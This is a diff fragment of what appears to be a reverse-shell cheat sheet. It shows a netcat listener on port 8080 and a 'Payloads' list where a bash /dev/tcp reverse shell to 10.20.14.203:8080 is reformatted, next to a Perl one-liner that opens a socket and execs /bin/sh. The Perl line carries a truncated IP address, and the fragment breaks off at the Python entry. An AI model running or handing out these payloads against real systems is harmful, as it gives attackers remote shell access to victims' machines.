@@ -7,7 +7,9 @@ nc -vv -l -p 8080
 
 ## Payloads
 - BASH
-  - ```bash -i >& /dev/tcp/10.20.14.203/8080 0>&1```
+```
+bash -i >& /dev/tcp/10.20.14.203/8080 0>&1
+```
 - PERL
   - ```perl -e 'use Socket;$i="10.20.14";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'```
 - Python
